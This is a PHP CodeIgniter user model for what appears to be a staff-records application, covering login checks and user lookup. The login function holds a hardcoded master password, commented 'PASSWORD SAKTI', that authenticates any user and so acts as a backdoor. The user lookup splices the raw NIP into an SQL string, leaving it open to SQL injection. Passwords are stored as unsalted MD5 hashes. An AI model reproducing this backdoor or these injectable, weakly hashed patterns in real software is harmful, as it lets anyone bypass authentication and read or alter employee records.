<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * User_model class.
 * 
 * @extends CI_Model
 */
class User_model extends CI_Model {

	/**
	 * __construct function.
	 * 
	 * @access public
	 * @return void
	 */
	public function __construct() {
		
		parent::__construct();
		$this->load->database();
		
	}
	
	/**
	 * create_user function.
	 * 
	 * @access public
	 * @param mixed $nip
	 * @param mixed $email
	 * @param mixed $password
	 * @return bool true on success, false on failure
	 */
	// public function create_user($nip, $email, $password) {
		
	// 	$data = array(
	// 		'nip'   => $nip,
	// 		'email'      => $email,
	// 		'password'   => $this->hash_password($password),
	// 		'created_at' => date('Y-m-j H:i:s'),
	// 	);
		
	// 	return $this->db->insert('users', $data);
		
	// }
	
	/**
	 * resolve_user_login function.
	 * 
	 * @access public
	 * @param mixed $nip
	 * @param mixed $password
	 * @return bool true on success, false on failure
	 */
	public function resolve_user_login($nip, $password) {
		
		$this->db->select('password');
		$this->db->from('pegawai_data');
		$this->db->where('nip', $nip);
		$hash = $this->db->get()->row('password');
		

		//PASSWORD SAKTI
		if ($password=='ituji') 
		{
			return 1;			
			} 
				else 		
			{
			return $this->verify_password_hash($password, $hash);
		}
		
	}
	
	/**
	 * get_user_id_from_nip function.
	 * 
	 * @access public
	 * @param mixed $nip
	 * @return int the user id
	 */
	// public function get_user_id_from_nip($nip) {
		
	// 	$this->db->select('id');
	// 	$this->db->from('pegawai_data');
	// 	$this->db->where('nip', $nip);

	// 	return $this->db->get()->row('id');
		
	// }
	
	/**
	 * get_user function.
	 * 
	 * @access public
	 * @param mixed $user_id
	 * @return object the user object
	 */
	public function get_user($nip) {
		
		// $this->db->from('pegawai_data');
		// $this->db->where('nip', $nip);
		// return $this->db->get()->row();

		$kondisi = "WHERE A.nip = '".$nip."'";
		$query = $this -> db -> query("
			SELECT 
				A.*, C.*, D.*, E.*
			FROM 
				pegawai_data A
				left join jabatan_data D
					on A.nip = D.jabatan_nip
				left join unit_data B
					on D.unit_id = B.unit_id
				left join kode_pangkat C
					on A.pangkat_id = C.pangkat_id
				left join kode_jabatan E
					on D.jabatan_jenis_id = E.jabatan_jenis_id
			$kondisi
			AND D.jabatan_aktif=1 		
				");
		return $query -> row();		
	}
	
	/**
	 * hash_password function.
	 * 
	 * @access private
	 * @param mixed $password
	 * @return string|bool could be a string on success, or bool false on failure
	 */
	private function hash_password($password) {
		
		return md5($password);
		
	}
	
	/**
	 * verify_password_hash function.
	 * 
	 * @access private
	 * @param mixed $password
	 * @param mixed $hash
	 * @return bool
	 */
	private function verify_password_hash($password, $hash) {
		if($hash == $this->hash_password($password))
			{return true;} else {return false;}
	}
	
}
